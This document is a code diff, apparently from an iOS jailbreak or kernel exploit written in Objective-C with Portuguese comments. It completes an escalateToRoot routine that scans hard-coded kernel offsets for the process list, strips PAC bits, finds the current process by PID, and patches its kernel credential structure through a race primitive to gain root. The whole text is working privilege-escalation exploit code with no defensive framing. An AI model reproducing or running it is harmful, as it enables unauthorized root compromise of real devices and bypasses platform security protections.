@@ -116,10 +116,7 @@ extern char **environ;
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide]; // 0x21000000 ou o real
-    
-    // Offsets candidatos para AllProc no iOS 26.3 (A13)
-    // Adicionamos o alinhamento de 0x4000 (16KB)
+    uint64_t slide = [self leakKernelSlide];
     uint64_t offsets[] = {0x8F50000, 0x8F54000, 0x91F0000, 0x91F4000};
     uint64_t proc = 0;
 
@@ -127,7 +124,7 @@ extern char **environ;
         uint64_t ptr = (0xFFFFFFF007004000ULL + slide + offsets[i]);
         proc = [self kread64:ptr];
         
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando Offset 0x%llx -> Proc: 0x%llx", offsets[i], proc]];
+        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando 0x%llx -> Proc: 0x%llx", offsets[i], proc]];
 
         if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
             [self logToWeb:@"🎯 LISTA LOCALIZADA!"];
@@ -137,24 +134,29 @@ extern char **environ;
 
     if (proc == 0) return NO;
 
-    // --- TESTE DEFINITIVO DO PID EM 0x68 ---
     while (proc != 0) {
-        // PAC Strip para A13 (Fundamental!)
+        // PAC Strip para A13
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
+        // No A13 (iOS 26.3), o PID está em 0x68
         uint32_t p68 = [self kread32:(proc + 0x68)];
         
         if (p68 == getpid()) {
             [self logToWeb:@"✅ PID CONFIRMADO NO 0x68!"];
-            // ... (segue para o patch de ucred no offset 0xD8)
-            return YES;
+            
+            // Patch ucred (Offset 0xD8)
+            uint64_t ucred = [self kread64:(proc + 0xD8)];
+            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
+            
+            [self ppl_write_race:(ucred + 0x18) value:0]; // UID/GID = 0
+            setuid(0);
+            return (getuid() == 0);
         }
-        
-        // Próximo processo (p_list.le_next é 0x08 no A13)
         proc = [self kread64:(proc + 0x08)];
     }
     return NO;
 }
+
 
 
 - (void)logToWeb:(NSString *)text {
